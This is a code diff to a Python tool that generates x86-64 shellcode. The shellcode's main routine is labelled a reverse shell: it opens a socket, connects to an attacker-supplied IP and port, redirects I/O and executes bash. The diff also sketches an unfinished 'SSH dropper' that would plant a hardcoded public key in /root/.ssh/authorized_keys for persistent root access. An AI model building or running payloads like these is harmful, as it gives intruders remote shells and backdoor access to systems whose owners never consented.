@@ -85,6 +85,14 @@ SHELL = [
 
 # FUNCTIONS
 
+
+def str_hex(buffer: bytes) -> str:
+    line = buffer.hex()
+    n = 2
+    splitted = [line[i:i+n] for i in range(0, len(line), n)]
+    return r"\x" + r"\x".join(splitted)
+
+
 # Parse IP and return hexa
 def gen_ip_in_hex(splited_ip, inc: int):
     new_ip_parts = []
@@ -93,10 +101,7 @@ def gen_ip_in_hex(splited_ip, inc: int):
         new_ip_parts.append(str(new_part))
     new_ip_address = ".".join(new_ip_parts)
     var = socket.inet_aton(new_ip_address)
-    line = var.hex()
-    n = 2
-    splitted = [line[i:i+n] for i in range(0, len(line), n)]
-    return r"\x" + r"\x".join(splitted)
+    return str_hex(var)
 
 
 def clean_by_xor(reg: str):
@@ -143,6 +148,14 @@ class Shellcode:
 
         rd_index = randrange(index_range)
         self.__code += clean_functions[rd_index](reg)
+
+    def clean_all(self):
+        self.clean("rax")
+        self.clean("rbx")
+        self.clean("rcx")
+        self.clean("rdx")
+        self.clean("rsi")
+        self.clean("rdi")
 
     def create_socket(self, family: int, socket_type: int):
         family = r"\x" + str(family).zfill(2)  # 2 -> \x02
@@ -244,31 +257,41 @@ class Shellcode:
         self.__code += MOV["al"] + SYS_EXIT
         self.__code += SYSCALL
 
+    def open(file: str):
+        pass
+
+    def write(buffer: str):
+        pass
+
 
 # MAIN
 
 def main():
 
+    ssh_pub =   "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMxGorFJ1um5o7CxNy8fVaamFZzgoSO39/P2ItEf6fbd"
+    target =    "/root/.ssh/authorized_keys"
+
     # Check for valid arguments
-    if len(argv) != 3:
-        print("Error: 3 arguments expected !\nExemple: gen_shellcode.py 127.0.0.1 8989")
-        exit(1)
+    #if len(argv) != 3:
+    #    print("Error: 3 arguments expected !\nExemple: main.py 127.0.0.1 8989")
+    #z    exit(1)
 
     # Init Shellcode object
     sc = Shellcode()
 
-    # Code
-    sc.clean("rax")
-    sc.clean("rbx")
-    sc.clean("rcx")
-    sc.clean("rdx")
-    sc.clean("rsi")
-    sc.clean("rdi")
+    # Reverse shell
+    sc.clean_all()
     sc.create_socket(2, 1)
     sc.connect_socket(argv[1], int(argv[2]))
     sc.link_io()
     sc.exec_bash()
     sc.exit()
+
+    # SSH dropper
+    #sc.clean_all()
+    #sc.open(target)
+    #sc.write(ssh_pub)
+    #sc.exit()
 
     # Print final shellcode
     print(sc)
